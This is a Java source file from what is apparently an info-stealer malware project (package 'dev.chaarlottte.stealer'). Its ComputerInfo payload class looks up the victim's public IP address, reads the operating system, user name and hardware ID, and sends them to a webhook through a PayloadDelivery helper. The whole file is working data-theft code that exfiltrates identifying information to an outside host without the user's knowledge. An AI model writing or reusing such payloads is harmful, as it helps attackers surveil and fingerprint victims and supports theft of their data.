package dev.chaarlottte.stealer.payload.impl;

import dev.chaarlottte.stealer.payload.Payload;
import dev.chaarlottte.stealer.util.PayloadDelivery;
import dev.chaarlottte.stealer.util.Utilities;
import dev.chaarlottte.stealer.util.WebhookMessage;

import java.net.URL;
import java.util.Scanner;

public class ComputerInfo implements Payload {

    @Override
    public void execute() throws Exception {
        String ip = new Scanner(new URL("http://checkip.amazonaws.com").openStream(), "UTF-8").useDelimiter("\\A").next();

        PayloadDelivery.send(new WebhookMessage.Builder("Personal")
                .addField("IP", ip, true)
                .addField("OS", System.getProperty("os.name"), true)
                .addField("Name", System.getProperty("user.name"), true)
                .addField("HWID", Utilities.getHWID(), true)
                .build());
    }

}
